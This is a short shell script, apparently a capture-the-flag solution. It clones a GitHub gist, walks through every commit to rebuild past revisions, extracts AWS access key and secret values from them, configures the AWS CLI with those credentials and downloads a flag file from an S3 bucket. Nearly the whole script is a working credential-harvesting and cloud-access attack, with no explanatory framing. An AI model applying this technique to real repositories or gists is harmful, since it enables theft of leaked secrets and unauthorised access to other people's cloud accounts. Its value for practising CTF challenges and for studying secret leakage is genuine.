#!/bin/sh
# Pulls the gist down and interacts with it like a regular repo to view history

# gimme the url pls
if [ "$#" != 1 ]
then
	echo "Usage: $0 <Gist URL/Gist clone (.git) URL>" && exit
fi

if echo "$1" | grep -q "\.git\b"
then
	URL="$1"
else 
	PAGE="`wget -qO- $1`"
	URL="$(echo "$PAGE" | egrep -o "http.*?\.git\b")"
fi

echo "URL is : $URL"

# clone into /tmp
if [ -e "wellmareplus" ]; then rm -rf wellmareplus; fi
git clone "$URL" wellmareplus
cd wellmareplus
FILE="$(ls)"
echo "Going through revisions of $FILE"
LOGS="`git log | egrep commit | cut -d' ' -f2`"

#loop through commits and append to file 
if [ -e '/tmp/wellmare_dump' ]; then rm /tmp/wellmare_dump; fi
printf "%s\n" "$LOGS" | while IFS= read -r line 
do
	git checkout "$line" && cat "$FILE" >> "/tmp/wellmare_dump"
done 

echo "\n[The file is created at /tmp/wellmare_dump]"
# dump AWS creds
AWS="`cat /tmp/wellmare_dump | egrep AWS | cut -d':' -f2 | sed 's/^\s*//'`"
ID="`echo "$AWS" | head -1`"
SECRET="`echo "$AWS" | tail -1`"

# programatically access the S3
aws configure set aws_access_key_id "$ID"  && aws configure set aws_secret_access_key "$SECRET" && echo "[Configuration successful]\n"

# pull down flag 
aws s3 cp s3://wellmare/flag ./flag 
echo "\n============================="
cat ./flag && rm ./flag
echo "============================="

# done ! 
echo "\n[Removing temporary files/folders...]"
rm -f /tmp/wellmare_dump && cd .. && rm -rf wellmareplus
